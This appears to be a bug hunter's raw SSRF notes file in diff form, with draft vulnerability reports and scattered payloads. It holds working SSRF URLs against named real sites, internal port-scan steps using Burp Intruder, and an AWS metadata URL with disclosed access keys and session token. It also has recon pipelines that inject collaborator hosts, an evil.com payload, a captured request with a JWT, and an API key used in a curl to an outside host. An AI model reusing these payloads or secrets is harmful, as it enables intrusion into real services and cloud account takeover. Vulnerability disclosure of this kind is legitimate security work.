@@ -1,0 +1,236 @@
+SSRF
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com@615pcsnienat67065o6uulidm4swgl.burpcollaborator.net/175/455279239_720dfc98c8.jpg
+
+proxy
+page
+width
+url
+redirect
+file
+height
+cdn-cgi
+localhost
+
+
+Hi ipsy team,
+
+
+Aditya here , I found critical security issues in one of your subdomain . Please look into it
+
+Title: SSRF leads to internal port scan and disclosing information about AWS metadata
+Severity : P1
+
+Description:
+The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. Appending special characters/payloads in GET based URL gives information. 
+
+Endpoint: https://images.shopper.ipsy.com/720,fit,q85/payload_here
+
+Steps for port scan:
+1. https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+2. After "localhost:" add ports like 8080,22,21,25 and see the response 
+
+80
+image.png
+image.png
+
+
+
+
+URLs
+
+Port Scan
+
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:22
+
+
+AWS Metadata URL:
+
+https://images.shopper.ipsy.com/300,fit,q1/http://169.254.169.254/latest/meta-data/iam/security-credentials/imageproxy_server
+
+
+Disclosed Data:
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-01-29T08:50:42Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIARD6GXVWXRFRNHUOO",
+  "SecretAccessKey" : "zAjOKFFliRgAoQwwlVvjUh+5qCUoMwTUwR9Q8rbd",
+  "Token" : "IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJHMEUCIQDngpLHpcc0SUbQRcvq1+YWoIkIgxub2xYC2XLjbjpMAgIgIxoyoPHR+D9+h+dZqDbh5VmfP0BhOZpsA040nDcOSpkqgwQI6v//////////ARADGgwwNzcxODkzMjgzMDMiDMXFebMKEq8i7UrFnCrXAw2EI4Uq6KcUeSJ/6hx+TdeALNPSp+rUZGEZxSXEVcgDbeUbaitQpQiD+0IlzlMfCdyKEx2EVLy6boKMNZp8WUqiNQ9l6m7WQwhJQZpNoIq9R0Z8xbLPb1nqekNsw0g/8M91+4E7padeMeluSaY8eRPB0kHYoV3dX6Q7hmwPr65EA3/PSiyr847ALsmgFiCWe5x2pUwp7J9ACKH1S9an4Ins8XUtCboGdKS1IOjSPcL1cQdkoanBv/g74jHYEyLZO9vQ3PKMvDTpGTlsCkIk0gIofPrYjuUs7bWhMkZK4hfkdiv3/q5fqN+K6B2CXMkIf6guHuxcmAYn+ro9dGYrkbmxUBIEVvSmfZbmQJ6xJpiletRxQC+EMcI/7ykrQ/X9MU+4I2AzmA9nOqURJH5F+8BK96etpf4aLYn2FviolQ7JrzLAEnJyawAjbfZ2v0azQOEYeJ8AP9h6akGQTmwDIp4Yaj6YYqyZQfOkVW8yLSH06gWPcT/7BUAnTWvAQpMSa5S4NEexgF2kZZS9FpPzFHvrRE/SeVENP+JsmJBbQpVAFpN4gBwYPm2sll35ckyuvcddJ5WpbOK61jwRkYzvwTU2HLeRh9j2ec9qjTUt4DihE38d0++TojCHgNSPBjqlAZ7W3iRIZvN6MXnYgHwSkJa8Cq6IZRHT2N1AhKilXRu8F/i+AKtJc3WX3V8QoccFV4BTavfcSWUPOIAyJFgWfAhFLziVixWh4egkUu4mox6fx32Ggbi3BVTQoww7oODkWtdIX4U4hjwDPJj2Kah7q93Wi0I492t7gK2ymakQtvpgAT4f2kpflSshtRbrxqN7yIgrpoL0iaIs3h6P6EmdWc9QZayKUw==",
+  "Expiration" : "2022-01-29T15:02:44Z"
+}
+
+Hello knaw team,
+
+I aditya found security issue in your system where SSRF is leading to port scan
+
+Title: Internal SSRF to scan ports and force to make HTTP request
+
+Description:
+The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. Appending special characters/payloads in GET based URL gives information.
+
+Steps:
+1. Open URL https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:8080/jp2/14759615811661.jp2
+On port 8080 its giving instant response
+2.https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:80/jp2/14759615811661.jp2
+Its giving slow response or taking time to response
+3. https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:8080/jp2/14759615811661.jp2
+Changed localhost to 127.0.0.1 , 0.0.0.0 , [::]
+4. Capture URL in burp suite > Send to intruder
+5. Add port position as attacking position "8080"
+6. Go to payloads > numbers > from 1 to 10000 | step 1 = Start attack
+7. Observe the response where port 8080 is giving 200 OK and remaining are giving 404 etc
+
+Impact:
+As an attacker I am able to perform port scan internally , localhost payloads working (Blacklist payload) . Able to induce server to make HTTP request on different ports like 8080,443,80(DNS)
+POC:
+
+image.png
+
+
+
+
+
+502
+503
+
+
+
+
+
+
+
+SSRF automation
+
+
+subfinder -d target.com | httpx | tee subs.txt | sleep 3600; | cat subs.txt | waybackurls | tee data.txt | sleep 3600; | cat data.txt | gf ssrf | tee ssrf.txt
+
+
+cat data.txt | grep "=" | qsreplace "hj4w5jlbpl95sx2i9wmip1o9r0xrlg.burpcollaborator.net" | tee ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
+
+
+
+
+
+echo 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud | waybackurls | grep "=" | qsreplace "http://169.254.169.254/latest" | 
+
+
+proxy=
+page=
+img=
+red=
+url=
+
+APIPA: 169.254.169.254
+
+
+payload: 
+
+http://169.254.169.254/latest
+https://169.254.169.254/latest
+169.254.169.254/latest
+
+
+
+SSRF 
+
+1. HTTP req is imp
+2. DNS is no use 
+3. HTTP req , Sometimes its no use - IP yours = no ssrf , IP third party - NA
+
+paypal - aws , gcp 
+
+
+Aditya PC [malicous acitivity] = Aryan PC
+
+attacker.com - target.com
+
+
+sales.dell.com/api/us/imgurl=https://evil.com/aditya.xml
+
+
+
+USE
+1. Collaborator
+2. Repeater
+3. Intruder
+
+
+1.Detetction
+
+http 
+
+
+EXPLOIT
+1. Cross port scan p3
+80 HTTP - OPEN 
+443 HTTP - OPEN
+22 Filtered / Closed
+21 Mo req - Clsoed
+3306 DNS
+25 SMTP - OPEN
+8000
+8443
+
+
+PASTE URL fucntion is vulnerable for SSRF leads to cross port scan
+
+
+
+2. File over port + DOS p4 p1
+
+
+POST /links/website HTTP/1.1
+Host: backend-2.short.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 140
+Referer: https://app.short.io/
+Origin: https://app.short.io
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVlOTU5MzcxLTZmMGQtNDQzZS04OTFhLTJlNjA1ZTZjMDJiZCIsInVzZXJfaWQiOjEwMjE2NjgsImVtYWlsIjoieWNmZ3ZqaGJrQGdtYWlsLmNvbSIsImxvZ2luSGlzdG9yeUlkIjoiMTRiMzU1ZGMtZjUzMC00NzI2LTk5NmYtNmRhNDc0ZjZmYmYxIiwiaW1wZXJzb25hdGUiOmZhbHNlLCJpYXQiOjE2OTEyMzAzNjIsImV4cCI6MTY5MzgyMjM2MiwiaXNzIjoiYXV0aG9yaXplciJ9.WDd0Nt_WYeNXNg_se82pmMP5GaOkuXBZWf-Knaz6Xow
+Connection: close
+
+{"originalURL":"wzzd95ogm3ehqi0na2v3y2olhcn2br.burpcollaborator.net:443/admin","domain":"arnk.short.gy","source":"website","allowDuplicates":true}
+
+
+1.1 Clear all position
+1.2 url:443/admin - add admin as attack pos
+1.3 Go to payloads 
+1.4 Add from list 
+1.5. Server side variable names > Start attack
+
+
+
+
+3. Backend system scan p2
+4. Whitelist bypass p2 p1
+5. AWS metadata retrive P1
+
+
+Where check
+
+1. POST req 
+GET request
+
+
+ADD image
+Add link , URL
+Add data - bio , name , last name
+Headers
+Update link
+
+
+AJdAgnqCST4iPtnUxiGtTz
+
+
+curl -X POST \
+    -d url="https://9mwt039uxglj13wwecrd5u8klbr1fq.burpcollaborator.net/aditya.png" \
+    "https://www.filestackapi.com/api/store/S3?key=AJdAgnqCST4iPtnUxiGtTz"
